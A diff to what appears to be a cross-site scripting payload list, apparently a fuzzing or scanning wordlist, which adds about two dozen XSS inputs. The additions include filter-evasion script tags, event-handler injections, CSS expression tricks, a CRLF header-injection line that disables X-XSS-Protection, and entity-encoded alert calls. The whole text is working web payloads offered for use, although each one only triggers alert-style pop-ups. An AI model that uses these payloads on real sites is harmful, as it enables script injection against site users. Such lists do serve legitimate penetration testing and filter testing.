@@ -526,6 +526,29 @@ test";alert(1)</script>//
 'prompt(1);
 'alert(1);
 echo%20$_SERVER['PHP_SELF'];/%22%3E%3Cscript%3Ealert('xss')%3C/script%3E%3Cfoo
-index.php?decoded=94102%22%20onmouseover%3dprompt(929882)%20bad%3d%22&encode=Encode%20>>&idn_version=2003
-example.php?decode=<<%20Decode&encoded=94102%22%20onmouseover%3dprompt(938200)%20bad%3d%22
-index.php/%22onmouseover%3d%27prompt%28976724%29%27bad%3d%22%3E
+decoded=94102%22%20onmouseover%3dprompt(929882)%20bad%3d%22&encode=Encode%20>>&idn_version=2003
+decode=<<%20Decode&encoded=94102%22%20onmouseover%3dprompt(938200)%20bad%3d%22
+%22onmouseover%3d%27prompt%28976724%29%27bad%3d%22%3E
+<script>/*///*/alert('XSS')</script>
+cookie%3dvalue;%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<html><body><script>alert('XSS')</script></body></html>
+\";alert(/XSS/);//
+\\";alert(/XSS/);//
+<%tag style="x:expression(alert('XSS'))">
+<ScRiPt>alert('XSS')</sCrIpT>
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+<input onfocus="alert('XSS')" autofocus>
+<img/src="1"/onerror="alert('XSS')">
+<img%0Asrc="1"%0Aonerror="alert('XSS')">
+" autofocus onfocus="alert('XSS')
+";alert('XSS');//
+<img src="1" onerror ="alert('XSS')">
+<style onreadystatechange="alert('XSS')">
+<div style="x:expression(alert('XSS'))">
+<script>alert('XSS');
+<img src="1" onerror="alert('XSS')"
+<script >alert('XSS')</script >
+<img src="1" onerror="confirm('XSS')">
+<div style="x:expre/**/ssion(alert('XSS'))">
+<svg onload="alert('XSS')">
+<math href="javascript:alert('XSS')" style="position:absolute;top:0;left:0;width:5000px;height:5000px;">CLICKME</math>
+" autofocus onfocus="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;
